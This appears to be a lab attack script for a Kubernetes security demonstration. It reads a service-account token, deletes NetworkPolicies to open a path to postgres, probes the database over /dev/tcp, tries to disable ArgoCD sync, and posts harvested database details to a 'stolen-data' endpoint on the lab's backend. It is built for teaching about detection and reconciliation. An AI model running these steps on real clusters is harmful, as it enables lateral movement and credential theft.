#!/bin/bash
# =============================================================================
# Scenario 2 — Lateral Movement via NetworkPolicy Bypass
# attack.sh — two phases: pre-conditions (before deny-all deleted), then exploit
# =============================================================================

set -euo pipefail

BACKEND_URL="${BACKEND_URL:-http://secops-backend:3000}"
NAMESPACE="${NAMESPACE:-secops-lab}"

emit() {
  local phase=$1 severity=$2 title=$3 explanation=$4
  curl -sf -X POST "$BACKEND_URL/internal" \
    -H "Content-Type: application/json" \
    -d "{\"phase\":\"$phase\",\"severity\":\"$severity\",\"title\":\"$title\",\"explanation\":\"$explanation\"}" \
    || true
}

APISERVER="https://kubernetes.default.svc"
CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"

# =============================================================================
# PHASE 1 — PRE-CONDITIONS (before deny-all is deleted)
# Attacker reads what's already available, discovers network path is blocked
# =============================================================================

# ── Step 1: Read token ────────────────────────────────────────────────────────
emit "ATTACK" "WARNING" \
  "Pod reading network-tooling-sa token" \
  "Token readable at default mount path. Has NetworkPolicy admin rights — narrowly scoped but enough to remove namespace isolation entirely."

TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "")

if [ -z "$TOKEN" ]; then
  emit "DETECT" "SUCCESS" \
    "No token found — automountServiceAccountToken: false" \
    "No token at default mount path. Attack cannot proceed."
  exit 0
fi

# ── Step 2: Map NetworkPolicies (silent intelligence gathering) ───────────────
NP_LIST=$(kubectl get networkpolicy \
  --token="$TOKEN" \
  --server="$APISERVER" \
  --certificate-authority="$CA" \
  -n "$NAMESPACE" \
  --no-headers \
  -o custom-columns="NAME:.metadata.name" 2>/dev/null | tr '\n' ', ' | sed 's/,$//' || echo "unknown")

NP_COUNT=$(kubectl get networkpolicy \
  --token="$TOKEN" \
  --server="$APISERVER" \
  --certificate-authority="$CA" \
  -n "$NAMESPACE" \
  --no-headers 2>/dev/null | wc -l | tr -d ' ' || echo "0")

# =============================================================================
# PHASE 2 — EXPLOITATION (delete deny-all, open the path, use the credentials)
# =============================================================================

# ── Step 4: Strip the namespace egress isolation ──────────────────────────────
# Deleting deny-all alone is NOT enough — target-app stays egress-isolated by
# allow-dns + allow-target-egress-* (so it can only reach DNS/backend/k8s-api,
# and postgres stays blocked). To actually open the database path the attacker
# removes every egress policy that isolates target-app. ArgoCD (secops-lab, never
# suspended) restores them all in ~30s, re-sealing the path.
emit "ATTACK" "CRITICAL" \
  "Deleting NetworkPolicy: deny-all" \
  "Removing the namespace default-deny policy — first step in stripping the traffic isolation that keeps the database unreachable."

DELETE_RESULT=$(kubectl delete networkpolicy deny-all \
  --token="$TOKEN" \
  --server="$APISERVER" \
  --certificate-authority="$CA" \
  -n "$NAMESPACE" \
  2>&1 || echo "BLOCKED")

if echo "$DELETE_RESULT" | grep -q "BLOCKED\|denied\|forbidden"; then
  emit "DETECT" "SUCCESS" \
    "Kyverno: NetworkPolicy deletion blocked" \
    "Kyverno policy protect-networkpolicies denied the delete request at admission. NetworkPolicy intact. Database path never opened — window: 0 seconds."
  exit 0
fi

# Remove the remaining egress policies that still isolate target-app. Without
# this, target-app's egress stays limited to DNS/backend/k8s-api and postgres is
# unreachable even with deny-all gone.
for np in allow-dns allow-target-egress-to-backend allow-target-egress-to-k8s-api; do
  kubectl delete networkpolicy "$np" \
    --token="$TOKEN" \
    --server="$APISERVER" \
    --certificate-authority="$CA" \
    -n "$NAMESPACE" \
    --ignore-not-found=true 2>/dev/null || true
done

emit "ATTACK" "CRITICAL" \
  "Egress isolation stripped — workload can now reach the database" \
  "deny-all plus the target-app egress policies (allow-dns, allow-target-egress-*) are gone. target-app is no longer egress-isolated and can open a direct connection to postgres. ArgoCD (secops-lab) will restore all of them in ~30s — re-sealing the path. The window is open."

# ── Step 5: Probe postgres ────────────────────────────────────────────────────
POSTGRES_RESULT=$(bash -c 'echo > /dev/tcp/postgres/5432' 2>/dev/null && echo "OPEN" || echo "blocked")

emit "IMPACT" "CRITICAL" \
  "postgres:5432 → $POSTGRES_RESULT" \
  "TCP probe to the database after stripping egress isolation. Network path confirmed $POSTGRES_RESULT."

# ── Step 6: Try to suspend ArgoCD (will fail) ─────────────────────────────────
kubectl patch application secops-lab \
  --token="$TOKEN" \
  --server="$APISERVER" \
  --certificate-authority="$CA" \
  -n argocd \
  --type merge \
  -p '{"spec":{"syncPolicy":{"automated":null}}}' \
  2>&1 || emit "DETECT" "WARNING" \
    "ArgoCD suspend failed — SA has no rights to argocd namespace" \
    "network-tooling-sa is scoped to secops-lab only. ArgoCD cannot be touched, so GitOps stays in control. deny-all will reconcile back in ~30 seconds — closing the attacker's path. The breach does not persist."

# ── Step 7: Record window start ───────────────────────────────────────────────
WINDOW_START=$(date +%s)
curl -sf -X POST "$BACKEND_URL/internal/window-start" \
  -H "Content-Type: application/json" \
  -d "{\"scenario\":\"network-policy-bypass\",\"started_at\":$WINDOW_START}" \
  || true

# ── Step 8: Emit final IMPACT ─────────────────────────────────────────────────
emit "IMPACT" "CRITICAL" \
  "postgres=$POSTGRES_RESULT — with credentials stolen pre-attack, attacker can now run: psql -h ${DB_HOST:-postgres} -U ${DB_USER:-app} -d ${DB_NAME:-appdb}" \
  "Credentials were harvested before the network was opened (Phase 1). With deny-all deleted, those credentials now have a live path to the database. The attacker cannot suspend ArgoCD (SA is namespace-scoped), so GitOps restores deny-all within ~30s — closing this path. The breach is bounded by reconciliation time, with no persistence."

# ── Step 9: Send stolen data to backend ───────────────────────────────────────
STOLEN=$(jq -n \
  --arg creds "host=${DB_HOST:-postgres} user=${DB_USER:-app} database=${DB_NAME:-appdb} password=${DB_PASSWORD:0:2}***" \
  --arg np_map "$NP_LIST ($NP_COUNT policies)" \
  --arg postgres "postgres:5432 → $POSTGRES_RESULT" \
  --arg window "deny-all deleted — path open only until ArgoCD reconciles (~30s), no backdoor planted" \
  '{credentials: $creds, network_map: $np_map, postgres_probe: $postgres, exposure_window: $window}')

curl -sf -X POST "$BACKEND_URL/internal/stolen-data" \
  -H "Content-Type: application/json" \
  -d "{\"scenario\":\"network-policy-bypass\",\"data\":$(echo "$STOLEN" | jq -Rs .)}" \
  || true

echo "Attack complete — window open, ArgoCD reconciles deny-all in ~30s and the path closes (no backdoor)"
